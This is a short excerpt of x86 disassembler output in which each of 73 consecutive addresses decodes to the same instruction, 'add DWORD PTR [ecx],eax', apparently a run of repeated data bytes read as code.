  44c356:	add    DWORD PTR [ecx],eax
  44c358:	add    DWORD PTR [ecx],eax
  44c35a:	add    DWORD PTR [ecx],eax
  44c35c:	add    DWORD PTR [ecx],eax
  44c35e:	add    DWORD PTR [ecx],eax
  44c360:	add    DWORD PTR [ecx],eax
  44c362:	add    DWORD PTR [ecx],eax
  44c364:	add    DWORD PTR [ecx],eax
  44c366:	add    DWORD PTR [ecx],eax
  44c368:	add    DWORD PTR [ecx],eax
  44c36a:	add    DWORD PTR [ecx],eax
  44c36c:	add    DWORD PTR [ecx],eax
  44c36e:	add    DWORD PTR [ecx],eax
  44c370:	add    DWORD PTR [ecx],eax
  44c372:	add    DWORD PTR [ecx],eax
  44c374:	add    DWORD PTR [ecx],eax
  44c376:	add    DWORD PTR [ecx],eax
  44c378:	add    DWORD PTR [ecx],eax
  44c37a:	add    DWORD PTR [ecx],eax
  44c37c:	add    DWORD PTR [ecx],eax
  44c37e:	add    DWORD PTR [ecx],eax
  44c380:	add    DWORD PTR [ecx],eax
  44c382:	add    DWORD PTR [ecx],eax
  44c384:	add    DWORD PTR [ecx],eax
  44c386:	add    DWORD PTR [ecx],eax
  44c388:	add    DWORD PTR [ecx],eax
  44c38a:	add    DWORD PTR [ecx],eax
  44c38c:	add    DWORD PTR [ecx],eax
  44c38e:	add    DWORD PTR [ecx],eax
  44c390:	add    DWORD PTR [ecx],eax
  44c392:	add    DWORD PTR [ecx],eax
  44c394:	add    DWORD PTR [ecx],eax
  44c396:	add    DWORD PTR [ecx],eax
  44c398:	add    DWORD PTR [ecx],eax
  44c39a:	add    DWORD PTR [ecx],eax
  44c39c:	add    DWORD PTR [ecx],eax
  44c39e:	add    DWORD PTR [ecx],eax
  44c3a0:	add    DWORD PTR [ecx],eax
  44c3a2:	add    DWORD PTR [ecx],eax
  44c3a4:	add    DWORD PTR [ecx],eax
  44c3a6:	add    DWORD PTR [ecx],eax
  44c3a8:	add    DWORD PTR [ecx],eax
  44c3aa:	add    DWORD PTR [ecx],eax
  44c3ac:	add    DWORD PTR [ecx],eax
  44c3ae:	add    DWORD PTR [ecx],eax
  44c3b0:	add    DWORD PTR [ecx],eax
  44c3b2:	add    DWORD PTR [ecx],eax
  44c3b4:	add    DWORD PTR [ecx],eax
  44c3b6:	add    DWORD PTR [ecx],eax
  44c3b8:	add    DWORD PTR [ecx],eax
  44c3ba:	add    DWORD PTR [ecx],eax
  44c3bc:	add    DWORD PTR [ecx],eax
  44c3be:	add    DWORD PTR [ecx],eax
  44c3c0:	add    DWORD PTR [ecx],eax
  44c3c2:	add    DWORD PTR [ecx],eax
  44c3c4:	add    DWORD PTR [ecx],eax
  44c3c6:	add    DWORD PTR [ecx],eax
  44c3c8:	add    DWORD PTR [ecx],eax
  44c3ca:	add    DWORD PTR [ecx],eax
  44c3cc:	add    DWORD PTR [ecx],eax
  44c3ce:	add    DWORD PTR [ecx],eax
  44c3d0:	add    DWORD PTR [ecx],eax
  44c3d2:	add    DWORD PTR [ecx],eax
  44c3d4:	add    DWORD PTR [ecx],eax
  44c3d6:	add    DWORD PTR [ecx],eax
  44c3d8:	add    DWORD PTR [ecx],eax
  44c3da:	add    DWORD PTR [ecx],eax
  44c3dc:	add    DWORD PTR [ecx],eax
  44c3de:	add    DWORD PTR [ecx],eax
  44c3e0:	add    DWORD PTR [ecx],eax
  44c3e2:	add    DWORD PTR [ecx],eax
  44c3e4:	add    DWORD PTR [ecx],eax
  44c3e6:	add    DWORD PTR [ecx],eax
